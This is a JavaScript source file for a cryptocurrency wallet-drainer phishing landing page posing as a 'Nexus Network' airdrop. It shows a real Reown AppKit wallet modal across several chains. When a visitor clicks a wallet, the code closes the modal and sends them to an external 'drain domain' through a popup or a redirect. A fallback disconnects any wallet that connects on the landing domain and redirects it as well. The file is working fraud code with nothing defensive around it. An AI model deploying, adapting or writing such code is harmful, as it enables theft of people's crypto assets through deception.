// =====================================================
// LANDING PAGE — Real AppKit modal, redirect on wallet click
// =====================================================
import { createAppKit } from '@reown/appkit'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } from '@reown/appkit/networks'

// =====================================================
// CONFIG
// =====================================================
const CONNECT_URL = 'https://playholding.vercel.app/?popup=1';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';

const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// =====================================================
// APPKIT INIT — Real modal with real wallet detection
// =====================================================
const ethersAdapter = new EthersAdapter();

const modal = createAppKit({
  adapters: [ethersAdapter],
  networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — OmniChain Airdrop',
    url: window.location.origin,
    icons: [],
  },
  allWallets: 'SHOW',
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00f2fe',
  },
});

// =====================================================
// INTERCEPT — When user clicks a wallet, redirect to drain domain
// =====================================================
let redirected = false;

function goToDrain(walletName) {
  if (redirected) return;
  redirected = true;
  modal.close();

  const url = CONNECT_URL + '&wallet=' + encodeURIComponent(walletName || 'MetaMask');

  if (isMobile) {
    window.location.href = url;
  } else {
    const w = 420, h = 700;
    const left = (screen.width - w) / 2;
    const top = (screen.height - h) / 2;
    window.open(
      url,
      'connect_wallet',
      `width=${w},height=${h},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`
    );
  }

  // Reset after short delay so user can try again if popup blocked
  setTimeout(() => { redirected = false; }, 2000);
}

// Catch wallet selection events from AppKit
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (e === 'SELECT_WALLET' || e === 'CLICK_WALLET') {
    const walletName = event?.data?.properties?.name || 'MetaMask';
    goToDrain(walletName);
  }
});

// Fallback — if user somehow connects on this domain, redirect immediately
modal.subscribeProviders((state) => {
  const evmProvider = state['eip155'];
  if (evmProvider) {
    try { modal.disconnect(); } catch (e) { /* silent */ }
    goToDrain();
  }
});

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  redirected = false;
  modal.open();
};
